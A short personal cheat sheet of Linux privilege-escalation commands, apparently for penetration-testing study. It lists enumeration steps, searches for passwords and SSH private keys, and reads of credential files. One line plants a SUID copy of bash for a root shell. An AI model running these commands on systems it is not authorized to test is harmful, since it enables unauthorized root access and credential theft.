# Just my Linux Privilege Escalation Notes

# Check Kernel Version 
uname -a

# Check distro version
cat /proc/version

# Check all the services running by root and check other services that running by different users
ps aux | grep root

# Check what you can run as SUDO
sudo -l

# Then use this to check the binary allowed on SUDO
https://gtfobins.github.io/

# Check all the users
cat /etc/passwd

# Check history
history

# Check all the connection
netstat -ano

# Find no root Squashing, all the file you will be putting there will execute it as root
cat /etc/exports

# Find any SUID
find / -perm -u=s -type f 2>/dev/null

# Look for any password
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null

# Check shadow and passwd permission
ls -la /etc/passwd
ls -la /etc/shadow

# Check capabilities
getcap -r / 2>/dev/null

# Check schedulers and pay attention on the file permission, PATH and location if you can overwrite the file
cat /etc/crontab
systemctl list-timers --all

# If this command is executed by root it will create file /tmp/bash  and if it execute by /tmp/bash -p it will create a shell root
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> file.sh

# Look for any confidential files
find / -name "id_rsa" 2> /dev/null
